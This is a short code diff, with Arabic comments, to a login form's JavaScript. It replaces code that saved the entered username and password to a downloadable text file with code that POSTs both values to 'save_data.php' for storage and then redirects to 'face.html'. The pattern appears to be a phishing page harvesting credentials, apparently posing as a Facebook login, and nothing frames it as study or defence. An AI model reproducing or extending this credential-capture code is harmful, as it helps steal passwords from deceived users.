@@ -80,35 +80,18 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
   var username = document.getElementById("username").value;
   var password = document.getElementById("password").value;
   
-  // تحضير البيانات للتخزين في ملف نصي
-  var dataToSave = "Username: " + username + "\nPassword: " + password + "\n";
-  
-  // إنشاء عنصر textarea لتخزين البيانات والتحويل لنص
-  var textArea = document.createElement("textarea");
-  textArea.value = dataToSave;
-  document.body.appendChild(textArea);
-  
-  // إنشاء حقل input لتحديد مسار واسم الملف
-  var input = document.createElement("input");
-  input.type = "text";
-  input.value = "userdata.txt";
-  document.body.appendChild(input);
-  
-  // إنشاء زر لتنزيل الملف
-  var downloadButton = document.createElement("button");
-  downloadButton.innerText = "حفظ الملف";
-  downloadButton.onclick = function() {
-    var filename = input.value;
-    var blob = new Blob([textArea.value], { type: "text/plain" });
-    var link = document.createElement("a");
-    link.href = window.URL.createObjectURL(blob);
-    link.download = filename;
-    link.click();
+  // إنشاء طلب POST لإرسال البيانات إلى الملف الذي يقوم بحفظها
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "save_data.php", true);
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+      console.log("تم تسجيل الدخول بنجاح وتم حفظ البيانات!");
+      // هنا يمكنك تحويل المستخدم إلى الصفحة التالية بعد تسجيل الدخول
+      window.location.href = "face.html";
+    }
   };
-  document.body.appendChild(downloadButton);
-
-  // تحويل النافذة إلى صفحة face.html
-  window.location.href = "face.html";
+  xhr.send("username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password));
 });
 </script>
 </body>
